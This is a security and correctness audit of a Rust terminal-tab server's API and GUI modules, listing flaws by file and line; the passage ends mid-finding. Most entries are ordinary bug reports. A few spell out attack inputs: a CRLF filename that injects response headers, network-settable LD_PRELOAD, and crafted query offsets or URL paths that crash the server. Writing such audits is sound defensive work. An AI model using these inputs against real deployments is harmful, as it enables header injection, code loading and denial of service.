catbus.rs:37/73/125 session is not per-tab: find_session->newest_session() picks newest *.jsonl in the cwd-derived project dir, so N tabs agenting in the same repo all resolve to ONE transcript+socket -> /catbus/message can hit another tab's agent and /catbus/messages returns another tab's conversation; the per-tab agent_session_id already on the snapshot (api.rs:480) is ignored; catbus.rs:91 no lock gate — input.rs:27 refuses keystrokes 403 on LockState::effective_locked but catbus::message injects a full prompt (stronger than a keystroke) with no such check, so a manually-locked or schedule-closed tab still takes work over HTTP (read_only IS centrally gated at api.rs:1818, lock is not); catbus.rs:135 total = since + tail.len() trusts the client cursor — ?since=99999 on a 10-msg transcript answers total:99999 messages:[], and after a transcript compaction shrinks the count the saved cursor stays past EOF and total is permanently wrong; total should be the real parsed count; catbus.rs:77 socket derived as file_path.with_extension("sock") but find_session also matches plain Claude Code TUI sessions which have no socket -> POST /catbus/message on a claude tab yields 502 'agent socket: connect ... No such file' instead of a 4xx, and GET /catbus exposes no kind field so a client cannot tell promptable from not before trying; catbus.rs:91 blocking send with 10-min read timeout (catbus_agent.rs:425) on the spawn_blocking pool, no cancellation on client disconnect — an aborted mobile request still pins a thread and the agent still runs the prompt, so retries silently queue duplicate prompts; catbus.rs:130-139 unbounded response: whole remaining transcript incl. thinking + tool payloads materialised and serialized in one body, no lines/size cap unlike output.rs -> multi-MB body on long sessions

### `src/api/env.rs`

env.rs:113-132 parse_env_body never reads `respawn` even though it is part of the documented body schema at :51 and :113 — EnvChange is built with only {tab,set,unset}, so a client sending {\"respawn\":true} gets 200 {\"queued\":\"env\"} and the flag is silently discarded; the one semantically loaded field in the API is documented, accepted, and ignored; env.rs:122+129 non-string values are silently filtered out: {\"set\":{\"PORT\":8080}} (a JSON number, the obvious client mistake) drops the entry and still answers 200 'queued' — the endpoint reports success for a change it did not record, and the same applies to non-string members of `unset`; env.rs:115-131 there is no validation that the body is even an object or that the resulting change is non-empty: `null`, `[]`, `\"hello\"` and `{}` all parse, `v.get(\"set\")` returns None on each, and an empty EnvChange is pushed and answered 200 — every syntactically-valid-but-meaningless body succeeds; env.rs:55+80 pending_env_changes is an unbounded Vec with no cap, no dedup and no backpressure, and combined with the above every request (including the empty no-op changes) grows it — a client looping on POST /env while the main loop is not draining (no tabs, paused, shutting down) grows the queue without bound behind the global snapshot mutex; env.rs:117-125 `set` keys are passed through with no validation whatsoever — no check for empty, for NUL, or for '=' — so {\"set\":{\"A=B\":\"C\"}} reaches the child-process environment construction where a key containing '=' is either rejected downstream or splits into a different variable than the caller named; there is also no denylist, so LD_PRELOAD / PATH / LD_LIBRARY_PATH are settable over the network on an endpoint whose documented sibling flag respawns the tab's shell; env.rs:69-88 set_tab checks the tab BEFORE reporting a parse error: the body is parsed at :69 but the Err arm at :84 is only reached after resolve_tab_idx succeeds, so a malformed body aimed at a nonexistent tab returns 404 'tab not found' instead of the 400 that set_global (:52-60) returns for the identical body — the same client bug surfaces as two different diagnoses; env.rs:32+66 'missing tab id' is answered 404, but a path that carries no tab id at all is a malformed request, not a missing resource — 400 is the correct code, and returning 404 makes 'you sent the wrong URL' indistinguishable from 'that tab is gone'; env.rs:26-47 list_tab serves `snap.tabs[idx].tab_env`, which by its own doc (:28-30) only catches up 'as soon as the next snapshot rebuild lands' — a client that POSTs a change and immediately GETs reads stale values with no version, ETag or queued-change marker to tell it so, making the API read-after-write incoherent by design and silently; env.rs:97-102 the mask is total, so an empty value and a real secret both render as '******' — an operator cannot tell an unset-but-present variable from a set one, on the one endpoint built for eyeballing configuration; env.rs:134-148 the tests cover only mask_env_value: parse_env_body — the module's whole validation surface, and the source of the silent drops and the ignored respawn above — has no test at all, so none of those behaviours is pinned

### `src/api/files.rs`

files.rs:216-238 HEADER INJECTION: ascii_fallback filters only '"' and '\\' but not CR/LF, and display_name is a real on-disk filename, so a file named "a\r\nX-Evil: 1.txt" splits the response via Content-Disposition — reachable end-to-end because sanitize_basename (api.rs:963) strips no control characters, so POST /files?name=a%0d%0aX-Evil:1.txt plants the name and any later GET injects headers; files.rs:212 download reads the whole file into RAM with std::fs::read and NO size cap — upload is capped at 100 MiB but a 10 GB file in outbox/ (agent-produced, unbounded) is fully buffered before the response, and unlike upload there is no per-token concurrency cap on download either, so N concurrent GETs of a big file OOM the process; files.rs:39 the UploadSlot cap is acquired AFTER the router has already allocated vec![0u8; content_length] and read the body (api.rs:1661-1662), so the 429 fires with the 100 MiB already committed — the mitigation its own comment claims ('can't queue dozens of concurrent 100 MiB POSTs and amplify memory pressure') does not hold; the cap is also per-token with provided_token.unwrap_or("") at :38, so every master-token/local-CLI upload shares one bucket and legit CLI uploads 429 each other, while total in-flight memory stays unbounded at tokens x cap x 100 MiB; files.rs:128 staging name is the FIXED ".{name}.tmp" and write_new_file_no_symlink (api.rs:817) does remove_file-then-create_new, so two concurrent POSTs with the same ?name= race: one gets EEXIST 500, or B unlinks A's staging mid-write and A's rename fails ENOENT while B renames possibly-truncated data over dest — no uniquifier, no lock; files.rs:141-147 the 201 body echoes dest.to_string_lossy(), the tab's ABSOLUTE server path, straight to a share-token holder — the download half of this same file goes out of its way not to (:210-211 'do not echo the absolute server path'), so the two routes contradict each other and upload leaks the home dir/username; files.rs:73-77 upload refuses a locked tab with 423 but download has no lock check at all, so a share recipient can keep reading inbox//outbox/ while the operator has paused the session; files.rs:84 sanitize_basename silently REWRITES rather than rejects — ?name=../../etc/passwd becomes 'passwd' and the upload succeeds under a name the client never asked for; it also imposes no length limit, so a 255-byte legal name produces a 260-byte ".{name}.tmp" staging path that fails ENAMETOOLONG with a 500 for a filename the OS would have accepted; files.rs:52+164 a malformed tab key answers 404 'invalid tab key' where 400 is the correct status

### `src/api/limits.rs`

limits.rs:46+97 memory_max is validated but NOT bounded — parse_memory_bytes (lib.rs:1414) accepts "0"/"0G", so {"memory_max":"0"} passes memory_max_valid, gets 200, and cgroup.rs:159 writes memory.max=0 which OOM-kills every process in the tab instantly; same class: tasks_max:0 is accepted and cgroup.rs:165 writes pids.max=0 so the tab can never fork again — neither has a sane floor, and both are reachable from an authenticated POST with no confirmation; limits.rs:33-36 and 84-88 numeric fields are parsed leniently and dropped SILENTLY on any type mismatch — cpu_quota_percent of -50, 2.5, "200" (string), or >u32::MAX all become None; if paired with a valid memory_max the request returns 200 with the cpu cap silently absent, so the caller believes it capped CPU and did not (asymmetric with memory_max, which is strictly rejected); lib.rs:1376 cpu_max_line returns None for pct==0 while merge() stores Some(0), so cpu_quota_percent:0 is accepted and then makes resolve() shadow the GLOBAL default with a value that means 'unlimited' — setting 0 on a tab silently REMOVES the inherited cpu cap instead of pinning it; limits.rs:55 set_default OVERWRITES pending_default_limits (= Some(..)) instead of pushing to a Vec like the per-tab route at :112, so two `limit --all` calls landing between owner drains lose the first one entirely, still answering 200 {queued:"default-limits"} for the one that got dropped; limits.rs:77-96 clear:true and explicit axis values are accepted together with no error — consumers (app.rs:2560, headless.rs:2118) take the clear branch and discard `over` wholesale, so {clear:true,memory_max:"8G"} silently lifts all limits rather than resetting-then-setting; app.rs:2579 gates the whole default-limit apply (including preferences persistence) behind cfg(target_os="linux"), so on non-Linux this route returns 200 queued and nothing is ever applied or saved — no 501/notice to the caller; limits.rs:19-53 vs 70-104 are ~90% byte-identical including both error strings, so the two routes' validation will drift

### `src/api/net.rs`

net.rs:22-28+36 FAIL-OPEN on a malformed body: the disabled field is extracted with .ok().and_then(as_bool), so invalid JSON, a missing field, or a wrong type ({"disabled":"true"} as a string) all collapse to None, which :36 interprets as TOGGLE — a client trying to turn a tabs network OFF can silently turn it ON, and the response reports 200 with the flipped value as if intended; the sibling handler in this same file gets this right (:82-85 returns 400 on invalid JSON), so the asymmetry is self-evident; net.rs:36 the toggle semantics are non-idempotent by construction — new_val is computed from the current snapshot with no If-Match/ETag and no idempotency key, while the CLI clients that call these routes use short global timeouts and retry, so a net-off request that timed out AFTER being applied inverts the setting when retried; net.rs:46-47 the handler writes net_disabled into the live snapshot AND queues a pending change, so GET /tabs immediately reports the tab as airgapped even though nothing has been applied yet and the owner may never drain it (crash, exited tab, or the GUI edition) — for a security control the API should report the EFFECTIVE state, and here a false "net_disabled: true" is exactly the lie the 412 at :41-45 was added to prevent; net.rs:124-127 setting a non-empty allowlist silently clears a full airgap: a tab with no network at all becomes a tab that can reach the allowlist plus DNS, i.e. adding a restriction WIDENS access, and the response body says only {"allowlist_active":true} with no mention that net-off was dropped — the behaviour is documented in a code comment and nowhere the caller can see; net.rs:94-111 the comment says presets and CIDRs are validated "so a typo is a clear 400 rather than a silently-dropped rule", but DOMAINS get no validation whatsoever — net_policy::push_domain only trims and lowercases (net_policy.rs:233-252), so "https://api.anthropic.com/", a bare IP, a typo, or a string with an embedded newline is accepted with 200 and then simply never matches, leaving the tab confined more tightly than the operator believes (and the newline case feeds the nft-script injection path noted in the net_nft audit); net.rs:88-93 str_array silently DROPS non-string elements, so {"cidrs":[123]} yields an empty cidr list and a 200 whose allowlist_active is false — a typed-wrong request clears the allowlist instead of being rejected, the same fail-open shape as the /net body handling, and an entirely empty body (:79-81) is likewise a silent destructive clear; net.rs:88-116 nothing caps the number of presets, domains or cidrs — the lists are persisted into tabs.json and every domain becomes a sequential DNS query with a 3s timeout in the pre-resolver refresh loop (net_resolver.rs:140-170), so a few hundred domains give a resolver cycle that can never complete and the dynamic nft set is never refreshed; net.rs:21+78 both handlers slice the path by hand with unchecked byte arithmetic (p[prefix.len()..p.len() - suffix.len()]) and then match tabs by exact id equality, while the shared helpers parse_tab_key/resolve_tab_idx exist and are used by the neighbouring meta.rs — so these two routes both rely on a router invariant stated nowhere in the file and lose the by-name/by-uuid resolution every other tab route accepts

### `src/api/output.rs`

api/output.rs:219 payload[start_offset..] indexes an Arc<str> with a client-controlled byte offset — str RangeFrom PANICS when start_offset is not a UTF-8 char boundary, and the only guard is n <= total_len at :96, not a boundary check; the CRC gate is no protection because any share-link viewer can read the payload and compute crc32 of a mid-codepoint prefix, so ?since=<non-boundary N>&crc=<matching> is a remote panic/DoS on a public endpoint (payloads routinely contain multi-byte box-drawing and emoji); the fix shape is is_char_boundary or slicing as_bytes(), note :103 already slices bytes safely so the asymmetry is easy to miss; api/output.rs:110 vs :131-137 X-Cursor-Row carries two different coordinate systems depending on which mode fired — since-mode ships the ABSOLUTE full-buffer row (:110 full_cursor) while lines-mode rebases it by drop_count — with nothing in the response naming the convention, so a client that uses both modes silently mispositions the cursor by drop_count rows; api/output.rs:96+115 when since is stale (n > total_len, i.e. the scrollback ring shifted or the screen cleared — exactly the case the delta protocol exists for) the guard falls through to the query_lines arm, so a client sending since+crc+lines gets a line-tail instead of the full resync it asked for, and its cursor convention flips per finding above; api/output.rs:111-113 a CRC mismatch discards query_lines entirely and ships start_offset 0, so a viewer polling ?since&crc&lines=200 gets the WHOLE scrollback (hundreds of KB) on any alt-screen swap rather than the 200-line tail it bounded itself to — a surprising bandwidth cliff at exactly the moment the tab is busiest; api/output.rs:117-130 lines-mode walks the payload twice (lines().count() then a second find('\n') scan), which is the same O(n) cost the comment at :58-62 went to the trouble of moving out from under the snapshot mutex; api/output.rs:225 the ETag is emitted only for full bodies but the 200 response for a delta still carries no ETag while X-Output-Start varies per request, so the same URL+query can yield different bodies as the buffer grows — with no Vary/Cache-Control visible here an intermediary cache has nothing correct to key on; api/output.rs:131-137 when the cursor row is above the dropped region the header is omitted entirely rather than clamped, so the viewer keeps its previous (now wrong) blink position instead of being told; api/output.rs:63-67 the raw_output.is_empty() fallback silently switches which buffer (and which CRC) the client is tracking mid-session; the mismatch path recovers, but X-Output-Length then changes discontinuously with no signal that the coordinate space changed

### `src/api/status.rs`

status.rs:19 REACHABLE PANIC: the tab id is carved out with raw byte slicing, p[12..p.len()-7], while the route guard at api.rs:1918 only checks starts_with("/tabs/by-id/") && ends_with("/status"). The path "/tabs/by-id/status" satisfies BOTH (its last seven bytes are literally /status) and is 18 bytes long, so the slice is p[12..11] — start greater than end, index-out-of-range panic. There is no catch_unwind anywhere in api.rs, so an authenticated POST to that one URL unwinds the connection handler (and aborts the process under panic=abort). A non-ASCII path can also land mid-char-boundary. Every other route in this directory uses parse_tab_key (api.rs:188-191), which is Option-returning and cannot panic; the same raw-slice pattern is copied into eight siblings — lock.rs:17, net.rs:21+78, ssh_agent.rs:35, schedule.rs:32, tab_props.rs:19+70+111 — each with the identical one-URL crash; status.rs:52-57 vs app.rs:2630 the clear operation is signalled by the MAGIC STRING "__clear__" placed in the caller-controlled  field, and the consumer keys on the label alone, so POST {"state":"thinking","label":"__clear__"} (or plainly ) wipes the tab's durable agent_session_id, agent_kind and agent_plan_mode. A data field is being used as a control channel with no guard against a caller supplying the sentinel directly; status.rs:39-62 the  branch returns early and DISCARDS sessionId, agentKind, planMode and daemon while answering 200 {"cleared":true}, so a Claude Stop-hook posting idle together with its session id silently loses the attachment it was reporting and gets a success response; status.rs:52 the queued sentinel also carries state: AgentState::Thinking as a deliberately meaningless value ('ignored — clear flag below'), so any future consumer that reads  without first checking the label will see a live tab as Thinking; status.rs:94-102 pending_status_updates is an unbounded Vec drained only on the 2 s persist tick, and every update is pushed unconditionally with owned Strings — a tab calling set-status in a loop grows it without limit between ticks, and since the updates are applied in order each merely overwrites the last, so all but one entry is pure waste. Contrast pending_activate / pending_claude_only, which are last-wins Options; status.rs:68-81 label, sessionId and agentKind are accepted with no length limit and no validation — they are written into durable tabs.json state and rendered in the desktop tab strip, and agentKind additionally drives behaviour elsewhere (app.rs:2128 gates alt-scroll on == "claude", brain.rs:656 filters its whole watch set on it, app.rs:2946 special-cases "brain"), so an in-tab process can both bloat persisted state and opt its tab into or out of the watchdog by asserting a kind; status.rs:89-93 the handler logs the agent SESSION UUID and kind at info level on every call, and Claude Code's hooks fire on each tool use, so a busy fleet writes one info line per tool call per tab and the session identifiers end up in the log; status.rs:19-23 a malformed key answers 404 'missing tab id' where 400 is the correct status, matching the same mislabelling seen in files.rs:52

### `src/api/tab_props.rs`

tab_props.rs:19/70/111 REQUEST-TRIGGERED PANIC: the dispatcher guards only starts_with("/tabs/by-id/") && ends_with("/badge") (api.rs:1966-1973) and the handler then slices &p[12..p.len()-6] with nothing checking that the two regions do not overlap — POST /tabs/by-id/badge satisfies BOTH guards, because the prefix's trailing slash is also the suffix's leading slash, giving &p[12..11] and a slice-index panic; identically /tabs/by-id/bg-color and /tabs/by-id/context both reduce to p[12..11]. api.rs:2156-2167 swallows it (spawn_blocking(...).await.unwrap_or_default() turns the JoinError into an empty Vec), so the process survives but the caller gets a meaningless empty response and NOTHING is logged — a panic that leaves no trace. It needs a valid master token, so this is an owner-triggerable fault rather than a hostile DoS, but it is a panic on a well-formed request path, and the same prefix/suffix slicing pattern is shared by the sibling setters (api/schedule.rs:32 and the other /tabs/by-id/... routes), so it is one defect, not three; tab_props.rs:118-124 a TYPE ERROR on context silently CLEARS it: {"context": 42}, {"context": {}} or {"context": []} all fail as_str(), collapse through and_then to None, and are then handled exactly like {"context": null} — the tab's context is wiped and a 200 is returned echoing null. badge handles the identical case correctly with an explicit 400 at 79-82. A destructive silent success on malformed input; tab_props.rs:23-37 bg_color reports a present-but-wrong-typed field as MISSING: {"color": 123} takes the same None path as an absent field and answers 400 'missing {"color": "#RRGGBB"} or {"color": null}', telling the caller the field is not there when it is — badge again distinguishes the two cases and bg_color does not; tab_props.rs:20/71/112 three different empty-body semantics in one 143-line file: bg_color 400s, badge 400s (from_slice fails on empty input), context treats an empty body as a CLEAR and returns 200 — and only context's doc comment (110) mentions its behaviour, so three sibling endpoints of identical shape answer the same request three ways; tab_props.rs:56/101/139 the three pending_*_changes vectors are unbounded and un-deduplicated: every POST pushes under the snapshot mutex and only the main loop's drain removes anything, so a script setting badges at speed — or a stalled drain (GUI not ticking) — grows them inside the very lock that every /tabs and /output poll must take, even though the semantics are last-write-wins per tab and repeated sets could coalesce; tab_props.rs:110 the comment says context is 'RW token only' while bg_color (16) and badge (69) say 'Master token only'; all three are in fact master-only, since sidecar_route (api.rs:178-180) admits only output/stream/outbox/inbox/input/files/activate/rename — a comment describing a WEAKER gate than the code enforces is exactly what invites someone to widen the code to match it; tab_props.rs:128-130 the 2000 cap counts chars(), not bytes: 2000 four-byte characters is 8 KB carried in the snapshot that every /tabs poll serialises, and the cut can split a grapheme cluster (emoji ZWJ sequence, combining accent) leaving a mangled trailing character — the response does echo the truncated value at 141, so the caller can at least see what was stored; tab_props.rs:128-130 the truncation runs BEFORE the whitespace check, so a context whose first 2000 characters are spaces is trimmed to nothing and silently becomes a CLEAR rather than a set

### `src/api/tabs.rs`

tabs.rs:139-157 close() resolves the UUID to a positional INDEX at :147 and queues that index (:153) for a drain that happens on a later main-loop tick — the comment at :140-141 says the UUID 'is the stable handle (index drifts as tabs open/close)' and the very next lines throw it away for the unstable one; any tab created or closed between the request and the drain (a GUI close, a queued new tab landing in the same batch — headless.rs:1945 drains closes and :1971 the new-tab queue in one pass) shifts the index and DELETE /tabs/by-id/<uuid> kills a different tab's shell; the sort+dedup+reverse at headless.rs:2406-2408 only fixes ordering WITHIN one batch, not the resolve-then-defer staleness; tabs.rs:180-183 create() increments pending_new_tabs unconditionally but only pushes to pending_new_tab_cwds when a cwd was supplied, and the two are consumed as independent queues (headless.rs:1971 takes the whole deque) — so `POST /tabs` with no body followed by `POST /tabs {\"cwd\":\"/a\"}` in the same batch gives count 2 and deque [/a], and /a is handed to the tab that asked to inherit while the tab that asked for /a inherits; the request→cwd pairing needs one queue of Option<PathBuf>, not a counter plus a sparse deque; tabs.rs:52+68-69 the /tabs body is cached in state.cached_response and invalidated only on MUTATION (invalidate_tabs), but two of the fields it freezes are time-derived: `locked` is effective_locked(t) which includes the schedule window, and uptime_secs advances continuously — so when a tab's schedule window closes, /tabs keeps reporting locked:false (and a stale uptime) out of the cache until some unrelated mutation happens to invalidate it, and the ETag matches so conditional clients see 304 on data that has silently gone wrong; tabs.rs:125-126 `to_string_pretty(&resp).unwrap_or_default()` caches the EMPTY STRING on a serialization failure and then serves it with status 200 to every subsequent request until the next invalidation — a transient failure is converted into a persistent, cacheable, successful-looking empty response instead of a 500; tabs.rs:52 preview is the last non-blank line with no length cap, so a single long line (a minified JSON dump, a base64 blob, a `cat` of a one-line file) becomes a multi-hundred-KB string per tab in EVERY /tabs response — the field exists (api.rs:228-231) precisely so clients need not fetch the full output, and unbounded it defeats its own purpose; tabs.rs:164-174 the cwd from the request body is turned into a PathBuf with no validation at all — no existence check, no canonicalisation, no confinement, no rejection of relative or `..` paths — and the endpoint answers 200 regardless, so a bad path fails silently later in the main loop where the client can never see it; tabs.rs:180+185-186 pending_new_tabs is an unbounded counter and the response carries no identifier: a loop of POST /tabs queues unlimited shell spawns with no cap or rate limit (and api.rs:153-154 grants POST /tabs to the sidecar remote token, not just the master), while the `{\"queued\":\"new\"}` reply forces every caller to guess which tab it made — cli/delegate.rs:248-278 diffs the whole tab list to work around exactly this and races other agents doing the same; tabs.rs:24-37 the cached-body fast path clones the Arc<str> under the lock and responds, but the miss path at :38-126 builds the entire response — every tab's preview, DNS list, meta map and allowlists — while HOLDING the global snapshot mutex, so one slow serialization blocks every other API request and the main loop's own snapshot rebuild

### `src/api/view.rs`

7 findings; top: view.rs:84 trim_matches('"') eats an escaped trailing quote so a tab name ending in " emits a broken JS string literal and bricks the viewer; view.rs:56 asset_depth ignores the trailing slash api.rs:1626 strips, so /view/ 404s all CSS+JS; CSP has no manifest-src so default-src 'none' blocks the shipped site.webmanifest

### `src/api_ws.rs`

api_ws.rs:1024/1043/1051/1060 the C→S queues are keyed by tab INDEX (api.rs:619-621 pending_input/pending_closes/pending_activate/pending_renames are usize) while every sibling queue in the same struct — pending_lock_changes, pending_bg_color_changes, pending_badge_changes, pending_context_changes, pending_schedule_changes, pending_resizes — is keyed by tab_id String. handle_inbound correctly resolves the UUID under the lock (992) and then throws the identity away, pushing a bare index onto a queue that is drained on a LATER tick (app.rs:1882 50 ms, headless.rs:1947 per tick); app.rs:1890 validates only 'idx < self.tabs.len()', never identity, so a tab closing or reordering between push and drain delivers the queued keystrokes to whatever tab now sits at that index. Worse, headless.rs:1945-1947 drains pending_closes and pending_input in the SAME batch, so a close in the batch shifts the indices the inputs were computed against. This is precisely the mis-routing class that authorise_and_ring's own docstring (336-343) describes closing for the S→C direction; the C→S direction still has it; api_ws.rs:385-395 extract_token's documented Authorization fallback is UNREACHABLE: 'let q = req.uri().query()?' returns None early, so a client that sets only 'Authorization: Bearer …' on an upgrade to a URL with no query string is rejected 401 'missing token' — the header is consulted only when the URL happens to carry some OTHER query parameter; api_ws.rs:280-330 ImeDedup silently swallows legitimate input: buf accumulates every single-byte keystroke (297-306), and a multi-byte frame arriving within the 200 ms window that equals buf is DROPPED (312-317) while one that merely starts with buf is truncated to its suffix (318-323). Type 'n' and paste 'no' within 200 ms and only 'o' reaches the shell; type 'ab' and paste 'ab' and the paste vanishes entirely. The docstring enumerates several tradeoffs it accepts but not this one, and there is no signal to the user that input was discarded; api_ws.rs:980-985 + 1027-1041 TAG_RESIZE is an acknowledged NO-OP ('v1 logs the request and drops it'), yet it is classified as a mutation, so an RO viewer that sends one is disconnected with a 1008 policy violation for a frame that provably changes nothing; api_ws.rs:986+1050 the WS_MAX_MESSAGE_BYTES docstring (126-137) justifies the 2 MiB cap by saying an oversized TAG_RENAME would otherwise 'stall every other tab while serde_json::from_slice parses the giant payload under the snapshot lock' — but the parse is STILL under that lock: 986 takes the global snapshot mutex and 1050 parses inside it, on the single-threaded runtime shared by every connection. The cap bounds the damage; it does not implement the fix the comment describes; api_ws.rs:876 vs 1084 the meta tick refreshes the dir counts with last_cwd — the PREVIOUS iteration's value — and stamps scanned_at, so current_meta's own refresh at 1084 (which has the CURRENT cwd) is TTL-suppressed and the emitted meta carries the old directory's inbox/outbox counts; after a cd inside the tab the badge shows the previous folder's numbers for up to a second; api_ws.rs:436-443 origin_ok consults x-forwarded-host BEFORE host and trusts it, while api.rs:1876 deliberately refuses to consult X-Forwarded-For on /logs on the grounds that 'a proxy on this host would then let anyone forge it'. Not browser-exploitable (JS cannot set headers on a WS handshake) so this is a policy inconsistency rather than a live hole, but the two security checks in this codebase disagree about whether proxy headers are trustworthy; api_ws.rs:496-497 percent_decode maps '+' to space, which is correct only for application/x-www-form-urlencoded and not for a generic URI query component — a token containing '+' is silently corrupted into one containing a space. Tokens are hex today, and the docstring already flags a sibling latent corruption (the %FF case) without noticing this one; api_ws.rs:1024/1051/1060 pending_input/pending_renames/pending_closes are unbounded and pushed under the global snapshot mutex, so an authenticated RW client can grow them without limit inside the lock that every /tabs and /output poll also needs

### `src/app.rs`

app.rs:3124-3146 close_all_tabs rebuilds TabState WITHOUT schedule while the periodic persist at :2009-2031 includes schedule: tab.schedule.clone() — so ..TabState::default() leaves it None and every graceful shutdown (quit, close-all, the SIGTERM path at :2358-2361) silently WIPES every tab's off-hours auto-lock schedule from tabs.json; app.rs:2918-2920 and :3060-3062 both respawn paths reset prior_uptime and active_duration to ZERO, so a routine net toggle, colours toggle or 'Relaunch dead agents' destroys all uptime accumulated across previous runs, and :2277-2281 then writes the zeroed value over the on-disk sidecar; :2928 does the same for energy_wh but does NOT reset energy_wh_last_saved, so the delta test at :2290 immediately fires and persists 0.0 too; app.rs:1890-1893 remote keystrokes are addressed by tab INDEX (pending_input holds usize), so a tab closing between the HTTP/WS POST and the 16 ms drain delivers the user's typing into a DIFFERENT terminal — same positional-index-across-time pattern in pending_closes/pending_activate (:2826-2840), exit_confirm.tab_idx, close_confirm, TabSwitcher.order and the context-menu Tab(idx) closures; the bounds guards at :4964/:5092 prevent the panic but not the misdirection, and every other API path is keyed by the stable tab id; app.rs:2044 the api_consumers filter gates the whole per-tab loop, but that loop also maintains purely-LOCAL GUI state — rss_bytes for the tab-bar RAM gauge (:2132-2133, read at :3332-3343), resolved_badge (:2111) and the project tint pushed via set_bg_override (:2115-2123). With no API consumer and no web viewer (the normal desktop case) the gauge, the badge and the per-project tint freeze at their last value, so a cd into another project never re-tints the terminal; app.rs:1927-1930 and :2393 per-tab power is indexed POSITIONALLY (watts.get(i) against a Vec the sampler fills from tab order) while tab_connections at :2194-2200 correctly keys by tab id — any close or move_tab between the sampler writing and persist reading attributes watts, and the integrated energy_wh, to the wrong tab; app.rs:1808-1812 new tabs are named from self.tabs.len(), which repeats after any close, and the tab NAME is the filesystem key for tab-<name>.output/.uptime/.power/tokens_tab-<name>.json/agent_probe_tab-<name>.jsonl — two same-named tabs silently overwrite each other's history, and OutputSaver's dirtiness map at :577 is keyed by that same name so their saves thrash; nothing enforces name uniqueness; app.rs:3090-3094 rename_tab migrates only output/uptime/power and misses the tokens sidecar (written at :2352) and the agent-probe JSONL (:2761), orphaning both; agent_probe.forget is called on close (:1862) but not on rename, and :3098 ignores the fs::rename result then renames the tab anyway, so renaming onto an existing tab's name silently clobbers that tab's files; app.rs:1929 energy integration hardcodes the literal 2.0 second tick while the timer that drives it lives at :1167 — changing the persist interval silently mis-scales every tab's Wh, and a late tick under main-thread load under-counts with no correction; app.rs:947 is_active is computed as tabs.len() == saved_active using the RAW persisted value while the final active is clamped at :1092 with .min(len-1), so a stale or corrupt active index means no tab is marked active: none restores its scrollback eagerly, none spawns eagerly, and the tab actually shown boots as a deferred skeleton with unflushed pending_restore; app.rs:2599-2600 the global default-limit change is applied only under cfg(target_os = linux) and explicitly discarded elsewhere, so on a non-Linux GUI 'limit --all' is accepted, answered 200 by the API, and never applied OR persisted to preferences.json

### `src/bin/tab-atelier-headless.rs`

bin/tab-atelier-headless.rs:88 ctrlc::set_handler is the ONLY signal handler installed anywhere in the tree (grep: no sigaction/signal_hook/SIGTERM handler exists), and Cargo.toml:139 pins ctrlc with default-features = false, which turns OFF its 'termination' feature — so only SIGINT is caught and SIGTERM is not; that is systemd's default KillSignal, so 'systemctl stop' kills the daemon on the default disposition with SHUTDOWN_REQUESTED never set, no state persist, and none of the graceful tab teardown at headless.rs:1182-1192 — meanwhile headless.rs:780/786 and lib.rs:85 all document 'SIGINT/SIGTERM' and 'Returns Ok(()) on a clean shutdown via SIGTERM', a claim the build config cannot satisfy; bin/tab-atelier-headless.rs:67 vs :62 same ordering defect as src/main.rs:64 — READ_ONLY is stored AFTER dispatch(), which process::exits inside, so '--read-only <subcommand>' runs with read_only() false; the clap help already admits 'only meaningful when no subcommand is given', which argues for conflicts_with rather than silently accepting it; bin/tab-atelier-headless.rs:55 vs :62 --relay IS seeded BEFORE dispatch here while src/main.rs:75-77 seeds it AFTER — the two binaries set the same global on opposite sides of the exit point, and seeding it here is pointless work for a process that is about to exit inside dispatch; --claude-only is read and applied in src/main.rs:58+71-73 but does not exist at all in this file even though the shared Cli carries the flag, so 'tab-atelier-headless --claude-only' parses and silently does nothing; bin/tab-atelier-headless.rs:69 re-loads READ_ONLY through a SeqCst global one line after storing it, instead of using the local read_only the way src/main.rs:79 does — two copies of the same guard that already differ; bin/tab-atelier-headless.rs:44-49 --check-crypto is byte-identical to src/main.rs:50-55 and carries the same two problems: it exits(0) before dispatch so it silently swallows any subcommand on the same line, and it binds the ServerConfig to _config and drops it, proving only that the builder did not panic rather than that a cert can be resolved — six duplicated lines that belong next to install_rustls_provider in the lib; bin/tab-atelier-headless.rs:38 Cli derives #[command(version)] (dispatch.rs:40) so clap handles -V/--version and exits right here, which makes the manual 'args().any(|a| a == "-V")' scan at headless.rs:806-809 unreachable dead code — the same shape as the GUI's orphaned --check; bin/tab-atelier-headless.rs:83-86 try_run_as_service() collapses 'not launched by the SCM' and 'failed to attach to the SCM' into one bool, so a real service-attach failure silently degrades to console mode; the logger is not installed until headless.rs:793-804, i.e. after clap, --check-crypto, dispatch, the single-instance-lock failure and the service attach, so the 'another instance is already running' exit at :69-76 and every early failure leave nothing in the log; no tests

### `src/box_drawing.rs`

box_drawing.rs:141-196 the centre-to-edge bars deliberately OVERLAP at the cell centre (h_left spans 0..cx+t/2 and h_right spans cx-t/2..cell_w, likewise up/down), which is fine for an opaque fill but double-blends for any translucent foreground (dim/faint text, themed alpha) — every cross, tee and corner then shows a visibly darker square at its junction; box_drawing.rs:116-128 the same issue makes the coalescing fast path and the per-cell path disagree: h_bar's doc at :111-114 claims it paints 'exactly the union' of rects's two bars, true geometrically but h_bar emits ONE quad where rects emits two overlapping ones, so a translucent '─' run renders at a different opacity depending on whether the run coalesced; box_drawing.rs:124+148-149+162+170 nothing is snapped to device pixels — only the *thickness* is rounded (:102), the positions are raw cell_h/2 - t/2 and cell_w/2 - t/2, so an odd cell height (cell_h=19 -> y=8.5) or the usual fractional cell width puts a 1px rule on a half-pixel boundary and the GPU antialiases it across two rows at half opacity: the exact blurry/dashed symptom the module's header says it exists to fix; box_drawing.rs:101-103 stroke thickness derives from cell_h ONLY and is never clamped against cell_w, so on a condensed font or a large size where heavy (2*round(cell_h/12)) exceeds cell_w the vertical bar gets x = cx - v/2 < 0 and w > cell_w — it paints outside its own cell and bleeds over the neighbouring column, with no guard; box_drawing.rs:117-121 h_bar and rects disagree for any weight outside 0..=2: BoxParts is pub with pub fields and no validating constructor (new is private), so a caller building BoxParts{left:3,right:3,..} gets a LIGHT bar from h_bar (the `else light` branch) but NOTHING from rects (weight_px returns 0.0) — the two paths silently paint different ink for the same input; box_drawing.rs:66-96 parts() omits the pure single-direction stems '╴╵╶╷' (light) and '╸╹╺╻' (heavy), which map onto BoxParts exactly (e.g. '╶' = new(0,1,0,0)) and are not an inherent limitation like the doubles/diagonals the doc excludes — they fall back to the font, so a stem and the '─' it abuts render at different thicknesses and don't join; box_drawing.rs:103 the `.max(2.0)` on heavy is unreachable: light is already `.max(1.0)`, so light*2 >= 2.0 always — the guard reads as protecting small cells but does nothing; box_drawing.rs:141 rects has no guard for cell_w/cell_h <= 0 (a zero-height cell 